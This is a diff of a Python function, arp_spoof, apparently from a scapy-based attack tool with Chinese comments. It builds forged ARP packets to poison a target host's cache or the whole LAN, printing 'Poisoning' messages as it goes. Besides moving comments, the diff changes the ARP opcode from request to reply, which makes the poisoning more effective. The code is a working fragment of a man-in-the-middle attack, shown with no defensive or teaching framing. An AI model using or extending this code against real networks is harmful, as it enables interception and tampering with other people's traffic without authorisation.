@@ -22,10 +22,12 @@ def arp_spoof(iface, target, host, vlan_own=False, vlan_target=False):
     # target 目标机ip
     # host   伪装的ip
 
-    mac_self = get_if_hwaddr(iface)  # 获取自身mac地址
+    # 获取自身mac地址
+    mac_self = get_if_hwaddr(iface)  
 
     if target:
-        mac_target = getmacbyip(target)  # 获取目标机mac
+        # 获取目标机mac
+        mac_target = getmacbyip(target)  
 
         if not mac_target:
             print('[-]Error: Could not resole targets MAC address')
@@ -33,11 +35,11 @@ def arp_spoof(iface, target, host, vlan_own=False, vlan_target=False):
 
         ethernet = Ether(src=mac_self, dst=mac_target)
         arp = ARP(hwsrc=mac_self, psrc=host,
-                  hwdst=mac_target, pdst=target, op=1)
+                  hwdst=mac_target, pdst=target, op=2)
         print('[+]Poisoning --> ', target, end=' ')
     else:
         ethernet = Ether(src=mac_self, dst=mac_broad)
-        arp = ARP(hwsrc=mac_self, psrc=host, op=1)
+        arp = ARP(hwsrc=mac_self, psrc=host, op=2)
         print('[+]Poisoning --> LAN', end='')
 
     # 判断是否加入Vlan标识
